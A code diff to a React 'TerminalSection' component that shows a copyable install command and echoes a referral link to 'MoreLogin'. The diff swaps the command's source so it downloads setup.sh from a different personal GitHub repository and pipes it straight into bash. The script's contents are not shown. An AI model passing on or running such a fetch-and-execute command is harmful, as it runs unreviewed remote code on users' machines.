@@ -25,7 +25,9 @@ echo "Recommended Browser: MoreLogin"
 echo "https://www.morelogin.com/?from=AAlpjpHv4azO"
 echo "--------------------------------------------------"`;
 
-const ONE_LINER = `curl -sSL https://raw.githubusercontent.com/cloudops-tool/deploy/main/setup.sh | bash`;
+
+
+const ONE_LINER = `curl -sSL https://raw.githubusercontent.com/grekgt01/docker-run/main/setup.sh | bash`;
 
 export default function TerminalSection() {
   const [copied, setCopied] = useState(false);
@@ -39,7 +41,7 @@ export default function TerminalSection() {
   };
 
   return (
-    <section id="terminal" className="py-16 md:py-24">
+    <section id="terminal" className="py-16 md:py-24" style={{ background: 'hsla(var(--section-bg))' }}>
       <div className="container max-w-3xl mx-auto">
         <motion.div
           initial={{ opacity: 0, y: 20 }}
